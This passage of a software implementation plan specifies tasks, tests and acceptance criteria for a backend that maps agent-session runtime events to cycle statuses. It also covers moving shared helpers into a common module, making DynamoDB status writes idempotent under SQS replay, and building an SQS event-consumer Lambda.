**Three failure cases, and §A.4.6 draws the line between them.** Do not collapse them:

| Case | Disposition |
|---|---|
| `kind: 'plan'` or `kind: 'review'` (unsupported in this phase) | **DLQ** — replayable once Part 2's arm lands |
| `kind` is not one the consumer knows | **DLQ** — a genuine protocol violation, replayable after a fix |
| **`kind` contradicts `correlation.stage`** | **DLQ** — a CC configuration bug. **This check is only meaningful because the three tools produce three distinct kinds** (§A.4.3): a review payload mislabelled `stage: 'planning'` is caught here, whereas under a single collapsed tool both stages produced the same kind and the mislabel was undetectable |
| the payload is well-formed-as-a-message but fails CC's schema | **terminal cycle status, message consumed** — a model failure, not a protocol one (Task 3.5, §A.4.6) |

The third row is the one an implementer will get wrong by reflex. It is handled in the consumer (Task 3.5), not in this pure mapper — the mapper never validates a payload, which is what keeps it pure and unit-testable without a queue.

**(c) Per-stage `error` mapping.** `mapSessionEvent` maps `error` to `cycleStatuses.FAILED` unconditionally today (`:77-84`). That was correct while engineering was the only runtime-executed step; it is wrong the moment a plan or QA session can fail, because `PLANNING_FAILED` and `QA_FAILED` are in `ATTENTION_STATUSES` — a human can act on them — and `FAILED` is not.

| `stage` | `error` maps to |
|---|---|
| `planning` | `cycleStatuses.PLANNING_FAILED` |
| `engineering` | `cycleStatuses.ENGINEERING_FAILED` — **requires Phase 4b**; until then `FAILED`, unchanged |
| `qa` | `cycleStatuses.QA_FAILED` |

**(d) `sessionStatus: 'paused'` with a `reason` becomes an effect.** Today `'active'`/`'paused'` return `[]` (`:92-93`). An SDLC session cannot pause on a gate — there are no approvals and no questions (§A.7.1, §A.7.2) — so **every pause is a failure of some kind**, and the five reasons want different responses (§A.4.2). Map a `paused` with a `reason` to a status effect carrying the reason in its error text. A `paused` with **no** reason stays `[]`: that is the human-path shape and inventing a failure from it would fail cycles on an ambiguous signal.

Also add a `planCreated` arm producing an `activity` effect (Tier 1, §A.4.4). **`planCreated` is a progress signal, not the plan contract** — `submitPlan` is (§A.5.2). Do not write `expandedRequirements` from it; that is Part 2 Phase 5's job and it comes from the `completion` payload.

**Tests first.** Extend `backend/__tests__/runtimeEvents.test.js` (122 lines). Its existing structure — `describe` blocks for progress signals / terminal events / robustness, plus an `only()` helper at `:13-16` — is the shape to keep. **Several existing tests assert `stage: 'engineering'` implicitly (`:21`)**; update them to pass `stage` explicitly rather than relying on the default, so the hardcoding cannot creep back.

| Test name (sentence) | Fixture / input | Assertion |
|---|---|---|
| `it('labels activities with the stage from the envelope, not a hardcoded engineering')` | `toolStart` with `stage: 'qa'`, then `'planning'` | `effect.stage` is `'qa'`, then `'planning'` |
| `it('labels a failed tool call and a progress line with the same stage')` | `toolEnd` status error, and `progress`, both `stage: 'planning'` | both effects carry `'planning'`. Covers all three sites from (a) — **assert all three or the one you forget stays hardcoded** |
| `it('rejects a plan completion as an unsupported kind rather than guessing an effect shape')` | `ENVELOPE_COMPLETION_PLAN` (`kind: 'plan'`, `stage: 'planning'`) | a failure outcome naming **both** the kind and the phase that will support it (`plan` / Part 2 Phase 5). **Assert the message names the phase** — a bare "unsupported" gives an operator nothing, and this is a DLQ entry someone will read at 2am |
| `it('maps an engineering completion to the engineeringResult shape routeAfterEngineering consumes')` | `ENVELOPE_COMPLETION_ENGINEERING` | `engineeringResult` has exactly `{success, branchName, commitSha, changes}` — **the same key-set assertion the existing test at `:112-116` makes.** §3.4 of the architecture doc is explicit that the consumer must produce this shape and let the existing persist path derive the stored projection; mapping the payload straight onto the persisted shape skips `changes.files` and silently zeroes the file count in the progress line |
| `it('maps a blocked engineering completion to a failure carrying the blockedReason')` | `ENVELOPE_COMPLETION_BLOCKED` | a status/complete effect whose error text contains the `blockedReason`. Today a blocked agent silently stalls; this is strictly better |
| `it('rejects a review completion as an unsupported kind')` | `ENVELOPE_COMPLETION_REVIEW` (`kind: 'review'`) | same, naming `review` / Part 2 Phase 6 |
| `it('detects a review payload mislabelled as the planning stage')` | `ENVELOPE_COMPLETION_REVIEW_AS_PLAN` (`kind: 'review'`, `stage: 'planning'`) | a **distinct** failure from the unsupported-kind one, naming the mismatch. **This test is inexpressible under a single collapsed terminal tool** and it is the concrete reason three tool names were restored (§A.4.3) |
| `it('never silently returns no effects for a completion it cannot handle')` | both of the above | the result is **not** `[]`. **This is the important assertion in the pair.** An empty result is a silent drop — the consumer reports no failure and SQS deletes the message. A named failure is a DLQ entry and an alarm (§A.4.6) |
| `it('does not validate the payload — that is the consumer\'s job')` | a `completion` with `payload: null` at `stage: 'engineering'` | the mapper does not throw and does not inspect `payload` contents. Keeping the mapper pure is what makes the §A.4.6 split implementable: **the mapper decides protocol disposition, the consumer decides model-failure disposition** |
| `it('fails loudly when the completion kind does not match the correlation stage')` | `ENVELOPE_STAGE_MISMATCH` (`stage: 'qa'`, `kind: 'engineering'`) | throws, or returns an effect the consumer treats as a failure. **Assert it is not silently mapped** — that is the whole point |
| `it('fails loudly on a completion kind it has never seen')` | `kind: 'somethingNew'` | same. A future tool producing a new `kind` must DLQ and page, not be dropped |
| `it('maps a stream error to the per-stage failure status')` | `error` at each of the three stages | `PLANNING_FAILED`, `ENGINEERING_FAILED` (or `FAILED` pre-4b), `QA_FAILED`. **Assert against the `cycleStatuses` constants, never the string literals** — the hyphen/underscore class of bug (#708) is what literals cause |
| `it('maps a paused session with a reason to a failure naming the reason')` | `ENVELOPE_PAUSED_MAX_TURNS` | a status effect whose error contains `max_turns` |
| `it('maps a paused session with no reason to no effect, rather than inventing a failure')` | `sessionStatus: 'paused'` bare | `[]`. Guards against failing cycles on an ambiguous human-path signal |
| `it('still falls back to the session record for a completion-less completed session')` | existing tests at `:54-74`, unchanged | `buildCompletionEffect` still reached; `success: false` on a commit-less session |
| `it('maps planCreated to a progress activity, not to a plan write')` | `planCreated` | one `activity` effect; **no `cycleField` effect touching `expandedRequirements`** |
| `it('still ignores every cosmetic event and tolerates malformed input')` | existing tests at `:83-108` | unchanged, **minus `planCreated`** which must be removed from the ignore list at `:88` |

That last row is the one that will be missed: `planCreated` is currently in the "ignores cosmetic events" loop (`runtimeEvents.test.js:88`) and adding an arm for it makes that existing test fail. Move it out rather than deleting the assertion.

**Acceptance:** `cd backend && npx jest __tests__/runtimeEvents.test.js` passes with the new cases, and `grep -c "stage: 'engineering'" backend/lambda_handlers/agentDrivenOrchestrator/runtimeEvents.js` returns `0`.

**Commit:** `feat: map runtime events per stage with completion payloads`

### Task 3.3 — extract the cycle-effect machinery into `backend/common/cycleEffects.js`

**Three PRs, not one commit.** An earlier draft made this a single task while also calling it *"the riskiest revert in Part 1"* — a task that earns that description should not be one commit. It moves four functions out of a 4,984-line file, across **5** `routeAfterEngineering` call sites and **52** `addProgressLog` sites, converting closures over `docClient`, `TABLE_NAME`, `applyTransition`, `writeStatus`, `invokeQAAgent`, `getOctokit`, `extractOwnerRepo` and a 90-line QA branch into injected parameters — **with no feature flag and every application in the blast radius.**

**The module name is `backend/common/cycleEffects.js`.** Part 2's assumption is confirmed; this is the definitive answer to `DEP-P1-8`.

**Why it must move at all.** `sdlcEventConsumer` is a **separate Lambda**, and `package_lambda_with_common` copies only the handler directory's own top-level `.js` files (`scripts/deployment/package-lambdas.sh:141`) while serving `backend/common/` from the shared layer. So the consumer **cannot** `require` anything from `agentDrivenOrchestrator/`. `index.js` is not structured for import. Moving the shared pieces is the only option, and it is a net improvement to that file.

#### The three PRs

**PR (a) — the mechanical half. Low risk, merge first.**

Move `writeStatus` (`index.js:104-127`), the 5-argument `addProgressLog` wrapper (`:79-81`) and `extractOwnerRepo` (`:717`). All three are leaf functions: they call out to `docClient`/`TABLE_NAME`/`statusUpdateFragments` and nothing in `index.js` calls back into them beyond the obvious. **Carry the `addProgressLog` wrapper's docblock across verbatim** (`:70-78`) — it explains the two-signature hazard (a 5-argument call in `index.js` resolves to the wrapper, a 7-argument one to the shared helper) and it is the only thing stopping the next reader passing seven arguments.

**PR (b) — `applyRuntimeEffect` alone, and make its default arm throw.**

Move `applyRuntimeEffect` (`index.js:140-168`). It has exactly one production caller today (the consumer, which does not exist yet) plus the export at `:4982` that `applyRuntimeEffect.test.js` asserts. Low coupling.

**And change the default arm from `console.warn` to `throw`.** It is currently:

```js
default:
  console.warn(`[AgentOrchestrator] Unknown runtime effect kind: ${effect.kind}`);   // index.js:165-166
```

The consumer reports no batch-item failure for an unrecognised effect, so **SQS deletes the message.** That makes every effect kind the mapper can produce but the executor cannot handle a **silent data loss**. Throwing makes the effect vocabulary **fail-closed under at-least-once delivery** — one `throw` buys a DLQ entry and an alarm instead of a twenty-minute stall nobody can explain.

**Scope this correctly: the `default` arm is for a contract breach, not for bad model output.** §A.4.6 is the normative line. An effect kind the executor does not recognise means the mapper and the executor have drifted — replayable after a deploy, so the DLQ is right. A **malformed `submitPlan`/`submitReview` payload** is the opposite case and must **not** reach this arm: it is a deterministic model failure that the consumer converts to `PLANNING_FAILED`/`QA_FAILED` before any effect is produced (Task 3.5). If a malformed payload ever reaches the `default` arm, the consumer's validation is in the wrong place.

Part 2 raised this distinction and it is the better answer; an earlier revision of this document swept both cases into the throw.

**This is a behaviour change on a shared function, so it needs its own test**, and note the existing suite asserts the opposite: `applyRuntimeEffect.test.js:112-114` is `it('does not throw on an unknown effect kind')`. **Invert that test in this PR** — it was correct for a stub with no consumer and is wrong for a queue-driven one.

**PR (c) — `routeAfterEngineering` last, alone, with a live legacy cycle as the gate.**

Move `routeAfterEngineering` (`index.js:175-309`, 135 lines) and everything it closes over. This is the whole of the risk: five call sites (`:1921`, `:2197`, `:2926`, `:3743`, and via `applyRuntimeEffect` at `:155`), a conditional `PutCommand` on only one of four branches, and a synchronous QA invocation.

**Do not simplify it.** In particular: the `PutCommand` at `:198-204` sits **inside the `ai-qa` branch only** — the other three arms mutate `cycle` in memory and rely on their caller to write it. That is surprising and it must be **preserved, not fixed**; changing it here would silently change five call sites.

**Gate: run one live *legacy* (non-`buildMode: 'runtime'`) cycle end to end before merging anything that depends on this PR.** `buildMode` gates the dispatch decision, not this refactor, so every application is in the blast radius from the moment it merges. The full jest suite is necessary and not sufficient — `routeAfterEngineering` drives QA through a Lambda invoke that no unit test exercises.

#### What moves, and what each closure becomes

| Function | From | PR |
|---|---|---|
| `writeStatus` | `index.js:104-127` | (a). Task 3.4 then adds `expectedFrom` — move first, change second |
| the `addProgressLog` wrapper | `index.js:79-81` | (a) |
| `extractOwnerRepo` | `index.js:717` | (a) |
| `applyRuntimeEffect` | `index.js:140-168` | (b), plus the default-arm throw |
| `routeAfterEngineering` | `index.js:175-309` | (c) |

**Follow the `Queries.*` convention** (§0.2): the new functions take `(client, tableName, …)` as their first two arguments and the handler owns client creation. **No `process.env` inside `backend/common/`** — `invokeQAAgent` needs a Lambda ARN and `getOctokit` needs GitHub App config; both arrive as injected dependencies, not as env reads.

**Find the boundaries by content, not by line number, and pin them in a test.** The line ranges above are verified as of `938be378`, but a one-line-off extraction silently drops the first or last statement of a 135-line function and the tests would still pass. So: assert the extracted function's **first and last statements by name** — for `routeAfterEngineering` that is the `sdlcConfig` destructure at the top and `cycle.updatedAt = new Date().toISOString()` at the bottom (`:308`). Part 2's Task 4.3 does the same for the engineering-completion sequence, where the two documents disagree by 1–4 lines on both ends (§4(i) of the review).

#### What does NOT move here

**The engineering-completion sequence stays put.** It is Part 2 Task 4.3/4.4's to move, and Part 2 owns the `sdlcType`/`BUILDING`-hop decisions inside it. Moving it here would mean this task also owned the 422 PR fallback and the two `ConditionExpression`s. **Leave a comment in `cycleEffects.js` naming Part 2 Task 4.3 as its destination**, so the next person does not put it somewhere else.

**Its boundaries are `index.js:1839-1943`, and the end matters more than it looks.** An earlier revision of this document said `:1945`; **Part 2 disputed it with evidence and Part 2 is right.** Verified:

```
:1936        try {
:1937-1943     await docClient.send(new PutCommand({ … }));      <- :1943 is `}));`
:1944        } catch (condErr) {
:1945          if (condErr.name === 'ConditionalCheckFailedException') {
:1946            console.log(… 'cycle was cancelled, skipping save');
:1947            results.push({ success: false, cycleId, status: 'cancelled' });
:1948            continue;                                        <- belongs to the loop at :1692
:1949          }
:1950          throw condErr;
:1951        }
```

Ending at `:1945` splits the `catch` mid-clause — a **syntax error**, not a subtle bug. And the block cannot simply be extended to `:1951` and moved whole either: `:1948`'s `continue` is loop control for `for (const record of event.Records)` at `:1692`, and `:1947` pushes onto `processSQSCycleExecution`'s local `results` array declared at `:1689`. **`continue` outside a loop is also a syntax error.** So a mechanical "move lines 1839–1951" fails to parse, which is the good outcome; a mechanical "move 1839–1945" also fails to parse. Either way the implementer stops, which is why this is worth writing down rather than trusting arithmetic.

**Two coherent ways to end it. Part 2 owns the choice; this document's recommendation is (i).**

| | Extraction | Persistence | Loop control |
|---|---|---|---|
| **(i) recommended** | `:1839-1943` — the work **plus** the bare `PutCommand`, ending at `}));` | the `ConditionalCheckFailedException` **propagates** out of the extracted function | caller keeps `:1944-1951` verbatim: the `catch`, the `results.push`, the `continue` |
| (ii) | `:1839-1951` — including the try/catch | the function catches and returns `'persisted' \| 'cancelled'` | caller branches on the return value and does its own `results.push` / `continue` |

(i) is the smaller move and preserves control flow exactly, which is what a commit labelled "behaviour must be identical" should do. (ii) is a nicer shape but converts an exception path into a return value — **a control-flow change that deserves its own commit rather than riding a move.** Part 2's stated resolution reads as (ii)'s return type with (i)'s line range; those are not compatible, so pick one deliberately.

**Either way, `results` and `continue` stay in the loop.** That is the invariant.

#### Tests first

`backend/__tests__/cycleEffects.test.js` — test the extracted functions **directly**, which is the payoff of the extraction: they were previously only reachable through a 4,984-line module.

| Test name (sentence) | Setup | Assertion | PR |
|---|---|---|---|
| `it('takes the client and table name as arguments rather than closing over them')` | two different table names | writes land on both | (a) |
| `it('reads no environment variables')` | — | source grep for `process.env` returns zero. A source-grep guard per §0.2 | (a) |
| `it('keeps the addProgressLog wrapper at five arguments')` | call with `(pk, sk, stage, message, detail)` | the shared 7-argument helper received the injected client and table. Guards the hazard the docblock describes | (a) |
| `it('throws on an unknown effect kind, so the consumer DLQs instead of dropping the message')` | `{kind: 'nonsense'}` | **rejects.** Replaces `applyRuntimeEffect.test.js:112-114`, which asserted the opposite | (b) |
| `it('throws on a planComplete effect until Part 2 Phase 5 adds its arm')` | `{kind: 'planComplete', payload: {}}` | rejects. **Phase 3's mapper does not emit this kind** (Task 3.2(b) rejects planning-stage completions earlier, with a better message) — the test exists so that when Part 2 Phase 5 starts emitting it, the failure mode before its arm lands is a DLQ entry rather than a drop | (b) |
| `it('throws on a qaComplete effect until Part 2 Phase 6 adds its arm')` | `{kind: 'qaComplete', payload: {}}` | rejects, same reasoning | (b) |
| `it('is never reached by a malformed payload — that is the consumer\'s terminal-status path')` | — | a comment-backed assertion or a note in the suite header. **§A.4.6's line, stated where an implementer will read it.** A malformed payload arriving here means Task 3.5's validation is misplaced | (b) |
| `it('routes a no-qa cycle straight to pending approval')` | `sdlcType: 'no-qa'` | `PENDING_APPROVAL`, `stage: 'human_approval'`; QA **not** invoked | (c) |
| `it('routes a manual-review cycle to pending approval')` | `'manual-review'` | same | (c) |
| `it('routes a ci-only cycle to qa_waiting_for_tests')` | `'ci-only'` | `QA_WAITING_FOR_TESTS`; `cycle.message` set | (c) |
| `it('routes an ai-qa cycle to qa_testing and invokes QA')` | `'ai-qa'` | `QA_TESTING`; the injected QA invoker called once | (c) |
| `it('treats cycle.skipQA as an override to no-qa')` | `skipQA: true`, `sdlcType: 'ai-qa'` | `PENDING_APPROVAL`; QA not invoked. Guards the `:177` expression | (c) |
| `it('persists only on the ai-qa branch, as today')` | each of the four | a `PutCommand` **only** for `ai-qa`. **Surprising behaviour to preserve, not fix** | (c) |
| `it('abandons the ai-qa branch when the cycle was cancelled underneath it')` | `PutCommand` throws `ConditionalCheckFailedException` | returns without invoking QA, does not rethrow. Mirrors `index.js:205-211` | (c) |
| `it('extracts routeAfterEngineering whole — first and last statements intact')` | — | the moved source contains the `sdlcConfig` destructure and the trailing `cycle.updatedAt` assignment. The off-by-one guard | (c) |

`backend/__tests__/applyRuntimeEffect.test.js` — **retarget, do not rewrite.** The harness (`jest.isolateModules`, the `{send}` stub, `trackCommandArgs()`, the `jest.spyOn`s) is the exemplar §0.2 names and must survive. Point it at `common/cycleEffects`, invert the unknown-kind test, and **add**:

| Test name (sentence) | Assertion |
|---|---|
| `it('is still reachable from the orchestrator, so the SQS path and the event path share one implementation')` | `require('.../agentDrivenOrchestrator/index.js').applyRuntimeEffect` is a function and delegates to the shared module. The export at `index.js:4982` must not disappear — the existing test at `:85-87` asserts it and #763's wiring depends on it |

**Also update** `backend/__tests__/runtimeDispatch.test.js`'s source-grep wiring block (`:104-132`) if any of its four assertions reference a moved symbol. **Run the whole suite on every one of the three PRs**, not just the files touched.

**Acceptance, per PR:**
- `npm run test:backend` passes — **the whole suite**, 31+ files. A green subset means nothing here.
- After (c): `grep -c "^async function routeAfterEngineering" backend/lambda_handlers/agentDrivenOrchestrator/index.js` returns `0`, and `grep -c "routeAfterEngineering" …/index.js` returns `>= 5` (the call sites remain, delegating).
- After (b): `grep -c "console.warn.*Unknown runtime effect" …` returns `0`.
- **After (c), and before anything depends on it: one live legacy cycle reaches `PENDING_APPROVAL` or `QA_TESTING` with a draft PR.**

**Rollback.** Pure code, reverts cleanly — **but this is the first unguarded blast-radius change in the whole plan, and the rollback story from here on is a code revert of a refactor that later phases build on, not a DynamoDB edit.** `buildMode` gates the dispatch decision and bounds none of these three PRs. Merge them early in Phase 3 in order (a) → (b) → (c) and let each sit before the next, so a bisect has somewhere to land.

**Commits:**
- `refactor: move writeStatus and progress helpers into backend/common`
- `fix: throw on an unknown runtime effect kind instead of dropping the message`
- `refactor: move routeAfterEngineering into backend/common`

### Task 3.4 — make the status write idempotent under replay

**Files:**
- `backend/common/cycleEffects.js` (MOD — `writeStatus`)
- `backend/__tests__/cycleEffects.test.js` (MOD)

**This answers Part 2's `DEP-P1-7`.** Read §A.4.5 for the reasoning; the short version is that **duplicate delivery must be assumed** (dedup covers only a `SendMessage` retry within five minutes — not a DLQ redrive an hour later, not a republish after a restart that lost the counter) and today a replayed transition **moves a cycle backwards silently**.

`applyTransition` does not prevent it and is not going to. It defaults to `strict = false` and, on an illegal transition, calls `reportIllegalTransition` and then assigns anyway — `cycle.status = toStatus` at `sdlcEngine.js:544` runs unconditionally. The docblock at `:519-529` is explicit that this is deliberate: 24 of 54 call sites target `FAILED` from error handlers, and throwing there would strand a cycle in the state you are trying to leave.

**Take option 2 from §A.4.5: make the status write conditional.** Not option 1 (`strict: true` + catch), because that opts one caller into a mode the rest of the codebase does not use, and the table is admittedly incomplete (*"a gap in the table is at least as likely as a genuine bug in a caller"*, `sdlcEngine.js:524-526`) — so a table gap would become a dropped event.

Add an optional `expectedFrom` to `writeStatus`. When supplied, it adds a `ConditionExpression` asserting the cycle is still in the status the transition expects to move it *out of*, and `ConditionalCheckFailedException` is treated as **"already applied, nothing to do"** — logged at info, not warn, because it is the expected outcome of a replay and a warn-level line would train operators to ignore it.

**The pattern already exists in the file you are copying from.** `processPlanGeneration` uses `ConditionExpression: 'attribute_exists(PK) AND #status <> :cancelled'` at `index.js:1260` and `:1282`. Use the same `ExpressionAttributeNames` shape (`{'#status': 'status'}`) so the two read alike.

**`expectedFrom` must be optional and default to today's unconditional behaviour.** `writeStatus` has callers beyond the consumer, and 24 of the transition sites are error handlers reaching `FAILED` — **an error handler must never fail to record a failure because a condition did not hold.** The consumer passes `expectedFrom`; error paths do not.

**Tests first.** Extend `backend/__tests__/cycleEffects.test.js`.

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('writes the status unconditionally when no expectedFrom is given')` | omit `expectedFrom` | the `UpdateCommand` carries no `ConditionExpression`. **Preserves the error-handler path** |
| `it('asserts the current status when expectedFrom is given')` | `expectedFrom: ENGINEERING` | `ConditionExpression` references `#status` and `ExpressionAttributeValues` carries `'engineering'` |
| `it('treats a conditional check failure as already-applied rather than an error')` | send throws `ConditionalCheckFailedException` | resolves; does not rethrow |
| `it('does not swallow any other DynamoDB error')` | send throws `ProvisionedThroughputExceededException` | rejects. **The most important test here**: a catch-all would turn a throughput problem into silent data loss, and SQS would delete the message |
| `it('applies a replayed transition exactly once')` | call twice with the same `expectedFrom`; the second send throws the conditional failure | both calls resolve; **the cycle's status is the target, not something earlier.** This is the deliberate-replay test architecture doc §2.4 asks for |
| `it('still clears the polling index when the status is not pollable')` | a terminal status | the `UpdateExpression` includes the GSI4 removal. Guards `statusUpdateFragments` (`sdlcEngine.js:550-559`) — the comment at `:555-556` says a lingering `GSI4PK` keeps the cycle in the poller's results after it stops being pollable |
| `it('keeps status and polling index in one Update so they cannot be observed disagreeing')` | any | exactly one `UpdateCommand`. The docblock at `index.js:100-102` says why |

**Acceptance:** `cd backend && npx jest __tests__/cycleEffects.test.js` passes; `npm run test:backend` passes.

**Commit:** `fix: make the cycle status write idempotent under event replay`

### Task 3.5 — the `sdlcEventConsumer` Lambda

**Files:**
- `backend/lambda_handlers/sdlcEventConsumer/index.js` (NEW)
- `backend/lambda_handlers/sdlcEventConsumer/package.json` (NEW)
- `backend/__tests__/sdlcEventConsumer.test.js` (NEW)

**One Lambda, not one per stage.** Per-stage would mean a queue each (or content filtering on one), three event source mappings and three deploys, to avoid a `stage` switch in a pure function. The stage-dependent handling is Task 3.2's table and it lives inside `mapSessionEvent`.

**Copy the handler shape from `backend/lambda_handlers/devopsDiagnosisEngine/index.js:58-71`** — it is the repo's SQS-consumer exemplar and already does partial-batch reporting:

```js
exports.handler = async (event, context) => {
  const batchItemFailures = [];
  for (const record of event.Records) {
    try {
      await processRecord(record, context);
    } catch (err) {
      console.error('[SdlcEventConsumer] Failed to process record:', err);
      batchItemFailures.push({ itemIdentifier: record.messageId });
    }
  }
  return { batchItemFailures };
};
```

Also copy from it: clients constructed **once at module scope** (`:30-33`), `TABLE_NAME` from `process.env.DYNAMODB_TABLE_NAME` at module scope (`:34`), the bare `require('common/…')` form, and `[ComponentName]`-prefixed logs.

`processRecord`:

1. `JSON.parse(record.body)` — a parse failure is a batch-item failure, not a throw that kills the batch.
2. `validateEnvelope` (Task 3.1). Invalid ⇒ log the reason and **report the item as failed**. §A.4.1 requires an unknown `v` to fail rather than be ignored: silently ignoring it loses a cycle's events with no signal, and the DLQ + alarm is exactly the signal wanted.
3. `cycleKeyFromCorrelation` ⇒ `{pk, sk}`. **No DynamoDB read to resolve the cycle.**
4. Load the cycle once (the effects need `cycle` and `application` in `ctx` — `applyRuntimeEffect`'s destructure at `index.js:141`). A **missing** cycle is not retryable: log it and treat the record as **done**, not failed. A deleted cycle would otherwise block its message group for nine minutes and then DLQ, repeatedly, for every event the session emits.
5. Check cancellation before applying effects. `checkCancellation` (`engineeringAgent/orchestratorHandler.js:63-87`) is the prior art and architecture doc §5.2 says it moves here. A cancelled cycle's events are dropped, not failed.
6. **Validate a completion payload before applying it — and do NOT report a failure when it fails.** For a `completion` whose `kind` is `'plan'` or `'review'`, call `validateCompletionPayload(envelope.correlation.stage, payload)` (Task 3.1). **Check `kind` against `correlation.stage` first** (§A.4.3's table) — a mismatch is a protocol violation and DLQs, and validating a review payload against the plan schema would produce a misleading terminal status on the wrong step. This is the CC-side replacement for the tool-use JSON schema that the plan and review payloads no longer carry (§0.1.d(1)), and it is the only thing standing between a malformed plan and `expandedRequirements: undefined`.

   **On `{ok: false}`: write a terminal cycle status naming the offending field, consume the message, and return normally.** `PLANNING_FAILED` for a `planning` stage, `QA_FAILED` for `qa` — both are `ATTENTION_STATUSES` (`cycleStatuses.js`) and surface in the attention card with a retry action.

   **Do not throw and do not report a batch-item failure here.** §A.4.6 has the full reasoning; the short version is that a malformed payload is a **deterministic model failure**, so three SQS retries re-read the same bytes and reach the same answer while freezing that session's entire `messageGroupId` for ~9 minutes — and freezing every *later* event for the session too. A protocol violation is replayable and belongs in the DLQ; a bad model output is a cycle outcome a human acts on. **An implementer will collapse these two by reflex; the test list below pins them apart.**

   **Log the rejected payload in full.** It is the raw material for tightening the `instructions`, and without it a malformed plan is undiagnosable — the session is gone and CC never messages a running one.
7. `for (const event of envelope.events) for (const effect of mapSessionEvent(event, {session, stage: envelope.correlation.stage})) await applyRuntimeEffect(effect, ctx)`. **`applyRuntimeEffect` throws on an effect kind it does not handle** (Task 3.3 PR (b)), so a `planComplete` before Part 2 Phase 5 surfaces as a batch-item failure → DLQ → alarm, not a warn-and-drop. Do not catch and swallow it in `processRecord`'s own try/catch — the per-record catch is what turns it into a batch-item failure, which is exactly right.
8. Fetch the session **only** when an effect needs it — i.e. only on the `buildCompletionEffect` fallback path, using `getSession` from `backend/common/runtimeClient.js` (Task 2.6). **The normal completion path needs no fetch**, which is the round trip Task 3.2 (b) removes. Note `GET` may be a *resume* rather than a pure read on the runtime side (§A.2.2, Task 2.2b) — if Task 2.2b concluded it can disturb a running session, this call site must use whatever read-only path that task exposed.

**Timeout 180 s, and it is not arbitrary.** §A.4.5 fixes the pair: `visibility_timeout_seconds = 180` against a 3-minute consumer timeout is the tightest safe pair, and `maxReceiveCount = 3` gives ~9 minutes of frozen message group against a 20-minute stall threshold (`cycleStatuses.js:144`). **Changing either number without re-checking that budget is how this becomes a stall.** Put that sentence in the handler's docblock.

**`batch_size` and ordering.** A FIFO source delivers records from one message group in order within a batch. **Process records sequentially** — a `Promise.all` over `event.Records` would reorder effects within a session, which defeats `messageGroupId`. The loop above is sequential; keep it that way and say why in a comment, because `Promise.all` is the obvious "optimisation" someone will reach for.

**Tests first.** `backend/__tests__/sdlcEventConsumer.test.js`. **Copy the harness from `backend/__tests__/applyRuntimeEffect.test.js` wholesale** (§0.2) — `jest.isolateModules`, the `{send}` stub, `trackCommandArgs()`, and `jest.spyOn` on `dynamoHelpers.updateItem` and `progressLogger.addProgressLog`. Use the fixtures from Task 3.1; do not build new envelopes inline.

| Test name (sentence) | Fixture | Assertion |
|---|---|---|
| `it('applies every event in a coalesced batch, in order')` | `ENVELOPE_TIER2` (two `toolStart`, one `toolEnd`) | three effects applied; the `addProgressLog` calls are in the envelope's event order. **Assert the order** — it is what `messageGroupId` buys |
| `it('returns no batch item failures for a well-formed batch')` | `ENVELOPE_TIER2` | `{batchItemFailures: []}` |
| `it('reports an unparseable body as a batch item failure rather than throwing')` | `body: '{not json'` | one `itemIdentifier` matching the record's `messageId`; the handler resolved |
| `it('reports an unknown envelope version as a batch item failure, not a silent skip')` | `ENVELOPE_UNKNOWN_V` | one failure; and a log line naming the version |
| `it('reports an empty events array as a batch item failure')` | `ENVELOPE_EMPTY_EVENTS` | one failure |
| `it('isolates a poison record so other sessions in the batch still apply')` | three records: session A good, session B poison, session C good | exactly one failure (B); A's and C's effects **were** applied. §A.4.5: `ReportBatchItemFailures` on a FIFO source returns the failed message and every later message **in that group** — this test pins that other groups are unaffected |
| `it('resolves the cycle key from correlation without reading DynamoDB first')` | `ENVELOPE_TIER2` | the writes target `PK: 'APP#<applicationId>'` / `SK: <cycleId>`; **no `QueryCommand` and no GSI lookup was issued.** This is the property that makes the transport stateless |
| `it('treats a missing cycle as done rather than retrying forever')` | `GetCommand` returns no item | `batchItemFailures` is empty; a log line says the cycle is gone. **A retry here freezes the group for nine minutes per event on a deleted cycle** |
| `it('drops events for a cancelled cycle without reporting a failure')` | cycle in `CANCELLED` | no effects applied; no failures |
| `it('applies the per-stage failure status for an error event')` | `ENVELOPE_ERROR` at each stage | the status write targets the right constant per stage |
| `it('does not fetch the session on a completion that carries commitSha and branch')` | `ENVELOPE_COMPLETION_ENGINEERING` | `runtimeClient.getSession` was **not** called. The round trip Task 3.2 removes |
| `it('falls back to fetching the session when a session completes without calling the tool')` | `sessionStatus: 'completed'`, no `completion` | `getSession` called once; `buildCompletionEffect`'s result applied |
| `it('processes records sequentially so effects within a session cannot reorder')` | two records, same `messageGroupId`, with a slow first | the second record's first effect lands after the first record's last. **The test that stops someone adding `Promise.all`** |
| `it('does not double-apply a replayed terminal message')` | the same completion envelope twice, with the conditional status write in place | the status ends at the target; the second call's conditional failure is absorbed; **`routeAfterEngineering`'s QA invoker is called once, not twice** |
| `it('fails the cycle on a malformed plan payload instead of retrying it three times')` | a `planning`-stage `completion` whose payload fails `validateCompletionPayload` | `batchItemFailures` is **empty**; the status write targets `PLANNING_FAILED`; the error text **names the offending field**; **no write to `expandedRequirements`**; the rejected payload appears in a log line |
| `it('fails the cycle on a malformed review payload the same way')` | a `qa`-stage equivalent | empty `batchItemFailures`; `QA_FAILED` |
| `it('DLQs an unrecognised completion kind, which is the opposite disposition')` | `kind: 'somethingNew'` | **one `itemIdentifier`**, and **no** terminal status written. **Run this test immediately after the two above.** The pair is the §A.4.6 line, and reading them together is what stops the next person collapsing them into one handler |
| `it('reports an effect kind applyRuntimeEffect cannot handle as a batch item failure')` | a `planning`-stage completion with a valid payload, before Part 2 Phase 5 exists | one `itemIdentifier`, because `applyRuntimeEffect` throws (Task 3.3 PR (b)). **Assert the failure is reported, not swallowed** — a `console.warn` here is the silent-loss path this whole arrangement exists to close |
| `it('does not report a failure for a duplicate delivered after a runtime restart')` | the same envelope twice with **different** `dedupId`s (which is what a restart produces — §A.4.5) | both apply; no batch-item failure; the cycle's status is the target and `routeAfterEngineering` ran once. **This is now the expected path, not an edge case**, because the dedup id is a per-envelope UUID rather than a durable counter |

**`package.json`** for the handler directory: copy the shape of `backend/lambda_handlers/agentDrivenOrchestrator/package.json` and include only what the consumer actually needs — `@aws-sdk/client-dynamodb`, `@aws-sdk/lib-dynamodb`, and `@aws-sdk/client-lambda` if it invokes the QA agent. **Pin the same versions the orchestrator pins (`3.985.0`)** rather than using a caret; that file pins exactly and a divergence between two Lambdas sharing one layer is a debugging trap.

**Acceptance:**
- `cd backend && npx jest __tests__/sdlcEventConsumer.test.js` passes.
